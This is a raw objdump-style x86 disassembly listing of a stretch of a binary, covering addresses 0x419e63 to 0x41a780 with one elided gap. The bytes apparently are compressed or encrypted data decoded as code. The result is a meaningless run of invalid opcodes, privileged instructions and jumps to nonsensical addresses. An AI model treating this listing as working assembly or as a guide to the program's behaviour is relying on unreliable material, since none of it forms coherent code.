  419e63:	repnz aam 0xd5
  419e66:	test   eax,0x978e9f57
  419e6b:	push   ebx
  419e6c:	add    DWORD PTR [edx],esi
  419e6e:	xchg   edx,eax
  419e6f:	stos   BYTE PTR es:[edi],al
  419e70:	shr    DWORD PTR [ebx-0x24],0xb4
  419e74:	scas   al,BYTE PTR es:[edi]
  419e75:	cwde   
  419e76:	adc    BYTE PTR [ebx],al
  419e78:	add    eax,0x270f3ee0
  419e7d:	xchg   BYTE PTR [eax+0x15],al
  419e80:	fmul   DWORD PTR [ebx-0xc]
  419e83:	gs scas eax,DWORD PTR es:[edi]
  419e85:	sbb    dh,BYTE PTR [edi]
  419e87:	aaa    
  419e88:	jnp    0x419e46
  419e8a:	mov    BYTE PTR [edi+0x1f55d81a],al
  419e90:	mov    DWORD PTR [esi],ecx
  419e92:	sbb    edi,DWORD PTR [esi-0x27]
  419e95:	push   ebp
  419e96:	jmp    0x37c29403
  419e9b:	dec    esp
  419e9c:	loope  0x419ece
  419e9e:	(bad)  
  419e9f:	xchg   ebp,eax
  419ea0:	test   al,0x34
  419ea2:	mov    ebp,0xddaf67a1
  419ea7:	rol    BYTE PTR [ecx-0x43],0xaf
  419eab:	dec    esp
  419eac:	stc    
  419ead:	neg    DWORD PTR ds:0x62c8c517
  419eb3:	maxps  xmm7,XMMWORD PTR [ebx+0x2e]
  419eb7:	mov    eax,0xc9546767
  419ebc:	icebp  
  419ebd:	sub    esi,DWORD PTR [ebx-0x71]
  419ec0:	pop    esi
  419ec1:	jg     0x419e79
  419ec3:	(bad)  
  419ec4:	sub    al,BYTE PTR [esi]
  419ec6:	inc    edi
  419ec7:	das    
  419ec8:	daa    
  419ec9:	sahf   
  419eca:	dec    edi
  419ecb:	dec    edi
  419ecc:	jp     0x419ed0
  419ece:	call   0xd16e:0x2d6e979a
  419ed5:	xchg   esp,eax
  419ed6:	hlt    
  419ed7:	out    dx,eax
  419ed8:	(bad)  
  419ed9:	jo     0x419ede
  419edb:	aas    
  419edc:	data16 mov bl,0x67
  419edf:	cmc    
  419ee0:	retf   0xbedb
  419ee3:	mov    bl,0x9d
  419ee5:	mov    bh,0x73
  419ee7:	ror    BYTE PTR es:[edx-0x7c],0xdf
  419eec:	pushf  
  419eed:	sub    al,0xc8
  419eef:	test   al,0x9c
  419ef1:	or     al,0xbb
  419ef3:	jne    0x419f58
  419ef5:	mov    dl,0xec
  419ef7:	push   0x6d11b446
  419efc:	fstp   QWORD PTR [eax+0x2fadeff7]
  419f02:	arpl   WORD PTR [eax],dx
  419f04:	cli    
  419f05:	xor    DWORD PTR [ebx+0x55e12e7b],eax
  419f0b:	loop   0x419ee2
  419f0d:	cmp    BYTE PTR [edi+0x7a],ah
  419f10:	(bad)  
  419f11:	aad    0x97
  419f13:	jb     0x419f5f
  419f15:	jns    0x419f09
  419f17:	ins    DWORD PTR es:[edi],dx
  419f18:	in     eax,0xc8
  419f1a:	int    0xf7
  419f1c:	daa    
  419f1d:	xchg   edi,eax
  419f1e:	add    DWORD PTR cs:[esp+ebx*2+0x9],0xca577445
  419f27:	and    edi,eax
  419f29:	dec    ecx
  419f2a:	mov    al,ds:0xa667a97d
  419f2f:	lds    esi,FWORD PTR [edx+0x11f71d93]
  419f35:	and    ah,0x71
  419f38:	pop    ss
  419f39:	hlt    
  419f3a:	ss int 0xe0
  419f3d:	fdiv   DWORD PTR [edx-0x480d9c7]
  419f43:	nop
  419f44:	jle    0x419eca
  419f46:	adc    eax,DWORD PTR [ecx+0x34]
  419f49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f4a:	xor    eax,0xc72eec5e
  419f4f:	dec    eax
  419f50:	pop    esi
  419f51:	xor    eax,0xe83bed8b
  419f56:	imul   DWORD PTR [ebp+0x41]
  419f59:	lock clc 
  419f5b:	xchg   ecx,eax
  419f5c:	jg     0x419fb9
  419f5e:	jecxz  0x419f51
  419f60:	jns    0x419f48
  419f62:	xchg   esi,eax
  419f63:	pushf  
  419f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f65:	adc    bh,BYTE PTR [esi-0x7813030a]
  419f6b:	jae    0x419f44
  419f6d:	sbb    BYTE PTR [ebx-0x4a],ch
  419f70:	(bad)  
  419f72:	call   0xe47b6b9a
  419f77:	jno    0x419f74
  419f79:	xor    al,0x51
  419f7b:	mov    cs,WORD PTR [ecx]
  419f7d:	ja     0x419fbb
  419f7f:	loope  0x419f5b
  419f81:	push   ebx
  419f82:	idiv   eax
  419f84:	xchg   esi,eax
  419f85:	sbb    dl,cl
  419f87:	sbb    BYTE PTR [edx],ah
  419f89:	(bad)  
  419f8a:	imul   ebp,DWORD PTR [esi],0x75
  419f8d:	mov    ds:0x8efe3c6f,eax
  419f92:	in     al,0x7a
  419f94:	bound  ebp,QWORD PTR [edx]
  419f96:	xor    ebx,edi
  419f98:	sub    bh,BYTE PTR [eax]
  419f9a:	inc    edx
  419f9b:	cmc    
  419f9c:	aas    
  419f9d:	or     eax,0xbc53c782
  419fa2:	das    
  419fa3:	loopne 0x41a00b
  419fa5:	ins    DWORD PTR es:[edi],dx
  419fa6:	jnp    0x419f67
  419fa8:	fbld   TBYTE PTR [ebx+0x6a]
  419fab:	dec    eax
  419fac:	data16 add BYTE PTR [esi+0x224125af],cl
  419fb3:	xchg   BYTE PTR [edx],al
  419fb5:	sub    DWORD PTR [ebx-0x79858a9b],edx
  419fbb:	pop    edi
  419fbc:	add    al,0xc0
  419fbe:	lahf   
  419fbf:	pop    edi
  419fc0:	loop   0x419f4e
  419fc2:	jl     0x419fe5
  419fc4:	int3   
  419fc5:	sbb    cl,BYTE PTR [edi]
  419fc7:	inc    ebx
  419fc8:	mov    esi,0xe289f04f
  419fcd:	ret    0xf077
  419fd0:	mov    edi,0xb9f9df85
  419fd5:	ins    BYTE PTR es:[edi],dx
  419fd6:	lea    edi,[edi-0x7f40acda]
  419fdc:	xchg   DWORD PTR [edx-0xa],edx
  419fdf:	fsub   QWORD PTR [ecx+0x57d761c4]
  419fe5:	xchg   ecx,eax
  419fe6:	repz in al,dx
  419fe8:	data16 test al,0xc5
  419feb:	stos   BYTE PTR es:[edi],al
  419fec:	jmp    0xc819:0x6ea0c4ed
  419ff3:	xchg   esp,eax
  419ff4:	jno    0x41a022
  419ff6:	pop    ds
  419ff7:	iret   
  419ff8:	popf   
  419ff9:	gs pusha 
  419ffb:	pop    edi
  419ffc:	mov    ?,WORD PTR [ecx-0x37d2d321]
  41a002:	jg     0x41a04a
  41a004:	int    0x95
  41a006:	cwde   
  41a007:	jae    0x41a024
  41a009:	aaa    
  41a00a:	push   esp
  41a00b:	mov    ds,WORD PTR [ecx+0x39]
  41a00e:	shl    DWORD PTR [edx],0x7a
  41a011:	dec    ebx
  41a012:	imul   esi,DWORD PTR [ebx+0x6c],0x4b489b58
  41a019:	clc    
  41a01a:	mov    esp,0xe1316ab1
  41a01f:	pop    esi
  41a021:	xchg   esi,eax
  41a022:	pushf  
  41a023:	hlt    
  41a024:	jg     0x419fab
  41a026:	push   cs
  41a027:	cmp    ah,BYTE PTR [edi]
  41a029:	ret    
  41a02a:	adc    eax,0xa91b6731
  41a02f:	mov    ah,0x8f
  41a031:	cmp    edx,DWORD PTR [esi-0x4dd946f]
  41a037:	mov    WORD PTR [esi+0x68a58638],cs
  41a03d:	xchg   DWORD PTR [esi-0x26931067],esi
  41a043:	sub    DWORD PTR [edi],esp
  41a045:	popf   
  41a046:	lock mov bh,0xac
  41a049:	jmp    0xe8babe99
  41a04e:	jge    0x41a0be
  41a050:	nop
  41a051:	neg    BYTE PTR [edx+0x17e02d76]
  41a057:	mov    ?,WORD PTR [edi+0x3c]
  41a05a:	xchg   ebp,eax
  41a05b:	sub    esp,DWORD PTR [ecx-0x76096b5e]
  41a061:	ins    DWORD PTR es:[edi],dx
  41a062:	mov    dl,0xdf
  41a064:	jge    0x41a073
  41a066:	jl     0x41a00b
  41a068:	lods   eax,DWORD PTR ds:[esi]
  41a069:	mov    bl,0xbc
  41a06b:	inc    ebp
  41a06c:	sub    eax,0x67142626
  41a071:	push   edx
  41a072:	ror    BYTE PTR [ecx-0x18],0xb6
  41a076:	out    dx,eax
  41a077:	xchg   edx,eax
  41a078:	retf   0xf779
  41a07b:	jb     0x41a0ea
  41a07d:	imul   eax,edi,0x30
  41a080:	mov    BYTE PTR [ebp-0x34],dh
  41a083:	mov    es,WORD PTR [edx+edx*1-0x58462b59]
  41a08a:	rol    DWORD PTR [edx],0x8e
  41a08d:	jecxz  0x41a09f
  41a08f:	aaa    
  41a090:	mov    edi,0xd398d1ef
  41a095:	and    eax,0x328c5c41
  41a09a:	cmp    DWORD PTR [edx+eax*4+0x76],esi
  41a09e:	adc    ch,bh
  41a0a0:	rcl    DWORD PTR [eax-0x5d],1
  41a0a3:	jae    0x41a0a3
  41a0a5:	cs jns 0x41a0db
  41a0a8:	bound  ebp,QWORD PTR [esi]
  41a0aa:	stos   DWORD PTR es:[edi],eax
  41a0ab:	ja     0x465ed958
  41a0b1:	fld    QWORD PTR [edx-0x5a]
  41a0b4:	xchg   esi,eax
  41a0b5:	leave  
  41a0b6:	or     bl,BYTE PTR [ebx+0x3f]
  41a0b9:	dec    esi
  41a0ba:	pop    edi
  41a0bb:	dec    ecx
  41a0bc:	push   ss
  41a0bd:	xchg   esi,eax
  41a0be:	sbb    ebx,DWORD PTR [edi+0x71]
  41a0c1:	aaa    
  41a0c2:	shr    BYTE PTR [ebx],cl
  41a0c4:	push   eax
  41a0c5:	push   0x4a
  41a0c7:	mov    esi,0x2bfc7c4c
  41a0cc:	xor    BYTE PTR [ebx+0x26],dh
  41a0cf:	sub    dh,BYTE PTR [esp+edx*8-0x1d806cf7]
  41a0d6:	jb     0x41a123
  41a0d8:	pop    ds
  41a0d9:	and    eax,esp
  41a0db:	xchg   ebp,eax
  41a0dc:	add    ebp,DWORD PTR [eax-0x74]
  41a0df:	push   ebp
  41a0e0:	mov    eax,0x4f148217
  41a0e5:	clc    
  41a0e6:	shl    DWORD PTR [ecx+0x5f],0x8b
  41a0ea:	das    
  41a0eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0ec:	dec    ecx
  41a0ed:	add    DWORD PTR [esi],eax
  41a0ef:	sub    DWORD PTR [edx-0x73],edi
  41a0f2:	adc    al,0x3b
  41a0f4:	je     0x41a158
  41a0f6:	popf   
  41a0f7:	push   eax
  41a0f8:	cmp    BYTE PTR ds:0xa289ee61,ah
  41a0fe:	fist   WORD PTR [esp+ebp*1+0x40]
  41a102:	test   al,0x8c
  41a104:	loop   0x41a145
  41a106:	shr    edi,0xf5
  41a109:	adc    eax,0x8fc35aac
  41a10e:	scas   al,BYTE PTR es:[edi]
  41a10f:	popa   
  41a110:	add    eax,0x68a58996
  41a115:	adc    ch,BYTE PTR [ebx]
  41a117:	sub    al,0xf0
  41a119:	dec    ebx
  41a11a:	push   cs
  41a11b:	dec    ebx
  41a11c:	mov    dl,BYTE PTR [ebp-0xcebd257]
  41a122:	retf   
  41a123:	mov    ebp,0x4fa0d120
  41a128:	shl    DWORD PTR [ebx+ebp*4+0x20],1
  41a12c:	addr16 add al,0xe
  41a12f:	lods   eax,DWORD PTR ds:[esi]
  41a130:	cmp    edx,0x7d
  41a133:	push   0xf36045b0
  41a138:	ret    0x3452
  41a13b:	cmc    
  41a13c:	and    al,0xd1
  41a13e:	inc    edx
  41a13f:	jecxz  0x41a166
  41a141:	and    BYTE PTR gs:[ecx+0x467ddcaf],ah
  41a148:	xor    ebx,DWORD PTR [ebx+ecx*1]
  41a14b:	xor    al,0xe9
  41a14d:	pop    edx
  41a14e:	dec    edx
  41a14f:	icebp  
  41a150:	stos   DWORD PTR es:[edi],eax
  41a151:	or     ebx,esp
  41a153:	mov    ah,0x49
  41a155:	push   ss
  41a156:	add    eax,edx
  41a158:	and    eax,0x9e514769
  41a15d:	ins    BYTE PTR es:[edi],dx
  41a15e:	pop    ebx
  41a15f:	adc    al,0x4e
  41a161:	sti    
  41a162:	dec    ecx
  41a163:	(bad)  
  41a164:	add    dh,BYTE PTR [eax]
  41a166:	add    eax,0x508a918a
  41a16b:	add    dl,ch
  41a16d:	js     0x41a189
  41a16f:	neg    ch
  41a171:	jns    0x41a1ca
  41a173:	adc    BYTE PTR [edi],ch
  41a175:	sbb    bh,bh
  41a177:	cmp    edi,ebx
  41a179:	mov    cl,BYTE PTR [edi-0x2e71faac]
  41a17f:	ins    BYTE PTR es:[edi],dx
  41a180:	xlat   BYTE PTR ds:[ebx]
  41a181:	scas   al,BYTE PTR es:[edi]
  41a182:	(bad)  
  41a183:	pop    esi
  41a184:	inc    ecx
  41a185:	call   0x1889:0x57c68c70
  41a18c:	test   al,0x2e
  41a18e:	push   0x37
  41a190:	inc    edi
  41a191:	clc    
  41a192:	mov    eax,ds:0xf878d3a2
  41a197:	mov    ah,0xbf
  41a199:	(bad)  
  41a19a:	xlat   BYTE PTR ds:[ebx]
  41a19b:	(bad)  
  41a19d:	shl    DWORD PTR [ecx+0x714a1d74],1
  41a1a3:	xor    eax,0xf668f5d4
  41a1a8:	jbe    0x41a21b
  41a1aa:	mov    gs,WORD PTR [edi]
  41a1ac:	out    0xce,al
  41a1ae:	add    ah,0x17
  41a1b1:	sub    al,al
  41a1b3:	js     0x41a1f1
  41a1b5:	aas    
  41a1b6:	sti    
  41a1b7:	mov    cl,0x65
  41a1b9:	xchg   BYTE PTR [ecx+0x7d],dl
  41a1bc:	fnsave [ebx+0x7c]
  41a1bf:	fnstenv [ecx-0x35188482]
  41a1c5:	and    edx,DWORD PTR [eax]
  41a1c7:	sahf   
  41a1c8:	hlt    
  41a1c9:	push   ss
  41a1ca:	(bad)  
  41a1cb:	and    ebp,eax
  41a1cd:	loope  0x41a1a6
  41a1cf:	sbb    al,0x2e
  41a1d1:	fld    QWORD PTR [edi-0x55fa317c]
  41a1d7:	or     DWORD PTR [eax-0x6c],eax
  41a1da:	pusha  
  41a1db:	int    0x3a
  41a1dd:	cmp    DWORD PTR [esi-0x62f3eed1],edx
  41a1e3:	(bad)  
  41a1e4:	mul    BYTE PTR [ecx+ebx*1-0x3a]
  41a1e8:	rol    BYTE PTR [esi],1
  41a1ea:	jno    0x41a175
  41a1ec:	push   edx
  41a1ed:	fstp   TBYTE PTR [edi+0xb]
  41a1f0:	cwde   
  41a1f1:	inc    esp
  41a1f2:	mov    cl,0x7e
  41a1f4:	outs   dx,BYTE PTR ds:[esi]
  41a1f5:	lods   al,BYTE PTR ds:[esi]
  41a1f6:	imul   eax,DWORD PTR [eax],0xffffffdd
  41a1f9:	push   cs
  41a1fa:	or     BYTE PTR [edi+0x3b],ch
  41a1fd:	mov    es,esi
  41a1ff:	out    dx,al
  41a200:	pushf  
  41a201:	adc    esi,edi
  41a203:	add    DWORD PTR [ebp-0x1c],esi
  41a206:	loop   0x41a23d
  41a208:	ret    
  41a209:	test   eax,0x245ec993
  41a20e:	leave  
  41a20f:	hlt    
  41a210:	push   cx
  41a212:	rcr    BYTE PTR [ecx-0x9],cl
  41a215:	and    ecx,esp
  41a217:	fwait
  41a218:	cli    
  41a219:	or     ch,BYTE PTR ds:0x5b8389c5
  41a21f:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41a221:	add    al,0x2a
  41a223:	mov    al,0x9c
  41a225:	ret    
  41a226:	xor    dl,BYTE PTR [ebx]
  41a228:	aaa    
  41a229:	pop    es
  41a22a:	inc    ecx
  41a22b:	jmp    0x41a211
  41a22d:	cld    
  41a22e:	push   ebp
  41a22f:	mov    eax,0x300ad924
  41a234:	nop
  41a235:	pushf  
  41a236:	jb     0x41a1d7
  41a238:	imul   ebx,DWORD PTR [edi+0x109f9d75],0x60
  41a23f:	xchg   esp,eax
  41a240:	gs sti 
  41a242:	or     ch,ch
  41a244:	cli    
  41a245:	mov    ebp,0x11301920
  41a24a:	repnz inc ebp
  41a24c:	sahf   
  41a24d:	bound  edi,QWORD PTR [ebx+ecx*1+0x57]
  41a251:	dec    edi
  41a252:	int    0x8
  41a254:	push   0xffffffaf
  41a256:	push   ecx
  41a257:	push   eax
  41a258:	dec    edi
  41a259:	sbb    eax,0xe3d4f1fb
  41a25e:	xor    eax,0x18bf0f27
  41a263:	adc    DWORD PTR [edx+0x4686606f],edi
  41a269:	aam    0x99
  41a26b:	sbb    BYTE PTR [edx+0x67],dl
  41a26e:	ret    
  41a26f:	dec    BYTE PTR [edi-0x44]
  41a272:	inc    ecx
  41a273:	mov    dl,0x92
  41a275:	lods   al,BYTE PTR ds:[esi]
  41a276:	inc    edi
  41a277:	arpl   bp,di
  41a279:	sbb    BYTE PTR [ebp-0x7a],bh
  41a27c:	js     0x41a2ba
  41a27e:	enter  0xcb9,0x86
  41a282:	int    0x7
  41a284:	mov    eax,0xb46a8362
  41a289:	iret   
  41a28a:	aas    
  41a28b:	jecxz  0x41a2c8
  41a28d:	push   0xf87c4605
  41a292:	pop    ebx
  41a293:	sub    bh,dl
  41a295:	mov    ebp,0xbfe846b7
  41a29a:	or     DWORD PTR [edx+0x18],esi
  41a29d:	push   esp
  41a29e:	in     al,0x2c
  41a2a0:	dec    ebx
  41a2a1:	xchg   esp,eax
  41a2a2:	mov    cl,0x38
  41a2a4:	dec    eax
  41a2a5:	aam    0x63
  41a2a7:	xor    DWORD PTR [edx],edx
  41a2a9:	mov    cl,0xc7
  41a2ab:	loope  0x41a230
  41a2ad:	mov    ecx,0x6d975b3d
  41a2b2:	fistp  DWORD PTR [esp+eax*1+0x7a]
  41a2b6:	fist   DWORD PTR [edi+edx*4-0x5c]
  41a2ba:	lock jecxz 0x41a2d3
  41a2bd:	push   esp
  41a2be:	inc    eax
  41a2bf:	adc    BYTE PTR [esi+0x12],cl
  41a2c2:	sub    ah,bh
  41a2c4:	call   0x637c85b0
  41a2c9:	stos   DWORD PTR es:[edi],eax
  41a2ca:	ret    0x7d6c
  41a2cd:	ins    BYTE PTR es:[edi],dx
  41a2ce:	mov    ah,0xa9
  41a2d0:	xor    al,bh
  41a2d2:	bound  ebx,QWORD PTR [eax-0x4f]
  41a2d5:	xor    cl,BYTE PTR [ecx+0x4568e61e]
  41a2db:	push   ecx
  41a2dc:	dec    esp
  41a2dd:	or     eax,0x0
	...
  41a4b6:	jbe    0x41a4e3
  41a4b8:	dec    eax
  41a4b9:	jbe    0x41a518
  41a4bb:	ja     0x41a53b
  41a4bd:	sub    esi,DWORD PTR [ebp-0x4b]
  41a4c0:	(bad)  
  41a4c1:	retf   0xdc50
  41a4c4:	test   DWORD PTR [ebp+0x205f3],esi
  41a4ca:	add    al,BYTE PTR [eax]
  41a4cc:	add    BYTE PTR [eax],al
  41a4ce:	jmp    0xa5b86457
  41a4d3:	xchg   ebp,eax
  41a4d4:	in     eax,dx
  41a4d5:	xlat   BYTE PTR ds:[ebx]
  41a4d6:	mov    edi,0xa0a36c7e
  41a4db:	rcr    BYTE PTR [ebp+eax*1-0x2f],0xd7
  41a4e0:	scas   eax,DWORD PTR es:[edi]
  41a4e1:	test   DWORD PTR [ecx],0x72200
  41a4e7:	add    BYTE PTR [eax+0x34],al
  41a4ea:	dec    eax
  41a4eb:	scas   al,BYTE PTR es:[edi]
  41a4ec:	mov    BYTE PTR [ebp-0x203245b0],al
  41a4f2:	dec    edi
  41a4f3:	iret   
  41a4f4:	cwde   
  41a4f5:	cli    
  41a4f6:	push   DWORD PTR [ebp-0x7517c0e0]
  41a4fc:	mov    edx,0xdfa15346
  41a501:	fisub  WORD PTR [edx-0x5b]
  41a504:	fdivp  st(7),st
  41a506:	mov    ds:0x12b32a53,eax
  41a50b:	and    al,0x2c
  41a50d:	or     dh,BYTE PTR [edi-0x58]
  41a510:	fmul   st(0),st
  41a512:	push   edi
  41a513:	enter  0x957,0xe0
  41a517:	int    0xdc
  41a519:	ins    DWORD PTR es:[edi],dx
  41a51a:	dec    ecx
  41a51b:	out    0xe6,eax
  41a51d:	or     bl,BYTE PTR [eax-0x5b]
  41a520:	lea    ecx,[ecx-0x4e]
  41a523:	(bad)  
  41a524:	mov    edi,DWORD PTR [eax-0x4a]
  41a527:	and    BYTE PTR [ecx],0x88
  41a52a:	(bad)  
  41a52b:	fimul  WORD PTR [eax]
  41a52d:	inc    edx
  41a52e:	push   edx
  41a52f:	push   esp
  41a530:	mov    esp,0x8601705b
  41a535:	push   0x52
  41a537:	in     eax,dx
  41a538:	inc    eax
  41a539:	and    cl,ch
  41a53b:	jge    0x41a53b
  41a53d:	ret    
  41a53e:	mov    ecx,0x552fe9fa
  41a543:	push   edi
  41a544:	mov    ds:0xf955a6c0,al
  41a549:	add    BYTE PTR [ebx+ebx*2+0x53395d88],ch
  41a550:	mov    al,0xbb
  41a552:	stc    
  41a553:	pop    es
  41a554:	inc    ebp
  41a555:	mov    ebp,0x2732ad66
  41a55a:	mov    bl,0xe1
  41a55c:	mov    eax,ds:0xc13892e0
  41a561:	fisub  DWORD PTR [esi+0x7848759b]
  41a567:	sbb    eax,0xdb6c174d
  41a56c:	and    al,0xfc
  41a56e:	jl     0x41a5ac
  41a570:	mov    ecx,eax
  41a572:	inc    edx
  41a573:	mov    edx,0xed733d27
  41a578:	lods   eax,DWORD PTR ds:[esi]
  41a579:	icebp  
  41a57a:	nop
  41a57b:	aas    
  41a57c:	pop    edx
  41a57d:	and    eax,0x5cfdc898
  41a582:	push   edx
  41a583:	push   0x7a53c42b
  41a588:	or     DWORD PTR ds:0xe0348002,ecx
  41a58e:	or     eax,0x957c7855
  41a593:	inc    esi
  41a594:	push   esp
  41a595:	into   
  41a596:	mov    bl,0x22
  41a598:	lods   eax,DWORD PTR ds:[esi]
  41a599:	ins    DWORD PTR es:[edi],dx
  41a59a:	dec    ecx
  41a59b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a59c:	mov    edi,DWORD PTR [eax+0x2e]
  41a59f:	sub    ebx,edx
  41a5a1:	push   ss
  41a5a2:	inc    edi
  41a5a3:	int    0xe5
  41a5a5:	add    edx,DWORD PTR [eax+esi*2-0x503a2d49]
  41a5ac:	push   esp
  41a5ad:	xlat   BYTE PTR ds:[ebx]
  41a5ae:	jns    0x41a560
  41a5b0:	into   
  41a5b1:	xchg   edi,eax
  41a5b2:	mov    cl,0x20
  41a5b4:	outs   dx,BYTE PTR ds:[esi]
  41a5b5:	push   esi
  41a5b6:	mov    dh,0xd9
  41a5b8:	test   eax,0x59b6102b
  41a5bd:	jmp    0x41a5be
  41a5bf:	jns    0x41a59a
  41a5c1:	pusha  
  41a5c2:	mov    bh,0xc1
  41a5c4:	sti    
  41a5c5:	inc    esi
  41a5c6:	mov    al,ds:0x58224532
  41a5cb:	icebp  
  41a5cc:	push   es
  41a5cd:	mov    esp,0xfe4abcb0
  41a5d2:	pop    es
  41a5d3:	push   0xffffff82
  41a5d5:	pop    edi
  41a5d6:	mov    ebp,0x361b3e8
  41a5db:	jne    0x41a622
  41a5dd:	adc    ebx,DWORD PTR [ebx-0x8]
  41a5e0:	cmc    
  41a5e1:	sub    al,0xb9
  41a5e3:	(bad)
  41a5e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5e7:	push   eax
  41a5e8:	rol    BYTE PTR [edi+ebp*8-0x56cc3608],cl
  41a5ef:	mov    ds:0x6dd86b52,eax
  41a5f4:	ss mov al,0x55
  41a5f7:	into   
  41a5f8:	jp     0x41a656
  41a5fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5fb:	push   0x1b
  41a5fd:	cmp    al,BYTE PTR [esi+0x78557a72]
  41a603:	push   ebp
  41a604:	jno    0x41a5d8
  41a606:	push   ss
  41a607:	or     eax,0xfeec660b
  41a60c:	mov    al,ds:0x65db1552
  41a611:	mov    es,WORD PTR [edx]
  41a613:	(bad)  
  41a614:	out    dx,al
  41a615:	loop   0x41a5fa
  41a617:	mov    al,ds:0xdd9ba518
  41a61c:	sub    eax,0xdea5265f
  41a621:	xchg   edx,eax
  41a622:	out    0x22,eax
  41a624:	adc    BYTE PTR [edx],al
  41a626:	ja     0x41a67f
  41a628:	gs push ecx
  41a62a:	sub    esi,esi
  41a62c:	iret   
  41a62d:	les    esi,FWORD PTR [esi+0x77]
  41a630:	lsl    ebp,WORD PTR [ebx+edi*1]
  41a634:	scas   al,BYTE PTR es:[edi]
  41a635:	fwait
  41a636:	jo     0x41a5fd
  41a638:	sahf   
  41a639:	sbb    DWORD PTR [edi],edx
  41a63b:	out    dx,al
  41a63c:	in     eax,dx
  41a63d:	jb     0x41a5c7
  41a63f:	das    
  41a640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a641:	cmp    eax,0x9a9fd17d
  41a646:	fst    QWORD PTR [eax+0x60]
  41a649:	cmp    al,0xc6
  41a64b:	push   ecx
  41a64c:	fdivr  st,st(7)
  41a64e:	mov    bl,0xea
  41a650:	cmp    ebp,DWORD PTR [ecx]
  41a652:	mov    ecx,0x1746ccbb
  41a657:	and    dh,bh
  41a659:	test   BYTE PTR [esi+edx*1+0x6e60f667],cl
  41a660:	lea    edi,[ebp+ebx*4-0x6081495]
  41a667:	xor    DWORD PTR [ecx],esi
  41a669:	out    dx,al
  41a66a:	ja     0x41a695
  41a66c:	inc    edi
  41a66d:	sbb    edx,DWORD PTR [edi]
  41a66f:	stos   BYTE PTR es:[edi],al
  41a670:	mov    cl,0x1d
  41a672:	pop    eax
  41a673:	imul   ebp,edx,0x3f7215bf
  41a679:	fwait
  41a67a:	ja     0x41a669
  41a67c:	push   0x11a94c60
  41a681:	xchg   ebp,eax
  41a682:	(bad)  
  41a683:	mov    WORD PTR [edx+0x68],ss
  41a686:	in     eax,0xb5
  41a688:	or     al,0xf8
  41a68a:	adc    BYTE PTR [edx+0x68],bl
  41a68d:	dec    esi
  41a68e:	aam    0xa2
  41a690:	dec    ebx
  41a691:	add    ah,BYTE PTR [ebx+0x6b1be309]
  41a697:	sar    DWORD PTR [ebp-0x45],cl
  41a69a:	pushf  
  41a69b:	cmp    al,0x20
  41a69d:	cmp    DWORD PTR ds:0x6f3f89f4,ebp
  41a6a3:	inc    edi
  41a6a4:	nop
  41a6a5:	call   0xa36f5984
  41a6aa:	add    ecx,DWORD PTR [eax]
  41a6ac:	sete   BYTE PTR [esi]
  41a6af:	popf   
  41a6b0:	cmc    
  41a6b1:	popf   
  41a6b2:	pop    ss
  41a6b3:	xor    al,0xfe
  41a6b5:	mov    edi,gs
  41a6b7:	mov    DWORD PTR [eax+0x56ffc09],eax
  41a6bd:	stc    
  41a6be:	dec    ebx
  41a6bf:	lea    edx,[ebx]
  41a6c1:	mov    DWORD PTR [edi+0x6d051c09],ebp
  41a6c7:	fwait
  41a6c8:	inc    edx
  41a6c9:	popf   
  41a6ca:	ret    0xaeb6
  41a6cd:	fst    QWORD PTR [eax]
  41a6cf:	mov    ebx,0xe1c9735a
  41a6d4:	xchg   ebp,eax
  41a6d5:	std    
  41a6d6:	aad    0x6a
  41a6d8:	imul   ebp,ebp,0xffffff85
  41a6db:	sub    edi,0xfffffff1
  41a6de:	and    esi,eax
  41a6e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6e1:	or     cl,BYTE PTR [edx]
  41a6e3:	sbb    al,0x3b
  41a6e5:	xor    dh,BYTE PTR [esp]
  41a6e8:	(bad)  
  41a6e9:	push   bp
  41a6eb:	pop    ebx
  41a6ec:	jl     0x41a6a3
  41a6ee:	pop    es
  41a6ef:	les    ebx,FWORD PTR [esi-0x62]
  41a6f2:	or     eax,0x10b7c431
  41a6f7:	xchg   ebp,eax
  41a6f8:	mov    cl,BYTE PTR [edx-0x72]
  41a6fb:	das    
  41a6fc:	sub    BYTE PTR fs:[eax+0x35882400],bl
  41a703:	dec    ecx
  41a704:	and    ch,bh
  41a706:	(bad)  [edx]
  41a708:	popa   
  41a709:	and    dh,BYTE PTR [ecx+0x15]
  41a70c:	cmp    ebp,eax
  41a70e:	fsqrt  
  41a710:	and    dl,BYTE PTR [eax+0x5a]
  41a713:	daa    
  41a714:	addr16 adc al,0x68
  41a717:	push   ss
  41a718:	popa   
  41a719:	mov    eax,ds:0xcec54fc3
  41a71e:	in     al,0x64
  41a720:	in     eax,0x58
  41a722:	mov    dh,0x3b
  41a724:	mov    al,0x98
  41a726:	dec    edi
  41a727:	(bad)  
  41a728:	fcom   DWORD PTR [edi-0x255934a1]
  41a72e:	fidivr DWORD PTR [ecx-0x311d9a83]
  41a734:	ins    BYTE PTR es:[edi],dx
  41a735:	xchg   ecx,eax
  41a736:	out    0x94,al
  41a738:	pushf  
  41a739:	mov    edi,0xb9570799
  41a73e:	test   al,0xc5
  41a740:	push   cs
  41a741:	xchg   ebp,eax
  41a742:	jl     0x41a723
  41a744:	int3   
  41a745:	pop    ss
  41a746:	icebp  
  41a747:	imul   ebp,DWORD PTR [ebx],0x58
  41a74a:	lahf   
  41a74b:	in     al,0xde
  41a74d:	mov    bh,0x10
  41a74f:	push   ss
  41a750:	cwde   
  41a751:	outs   dx,WORD PTR ds:[esi]
  41a753:	addr16 aaa 
  41a755:	mov    ds:0x8c3002d8,eax
  41a75a:	xor    esp,0x1a
  41a75d:	daa    
  41a75e:	add    al,0xfb
  41a760:	adc    esp,edi
  41a762:	dec    edi
  41a763:	mov    ds:0x60c37b36,al
  41a768:	sub    al,0xf0
  41a76a:	xor    bh,al
  41a76c:	div    BYTE PTR [edx+0x1e]
  41a76f:	inc    edx
  41a770:	mov    ecx,0xd02b4e81
  41a775:	lds    ebp,FWORD PTR [edi+0x50]
  41a778:	sub    al,0x3d
  41a77a:	sbb    ebp,DWORD PTR [ebx-0x14f80280]
  41a780:	test   DWORD PTR [edi],0xfd55415d
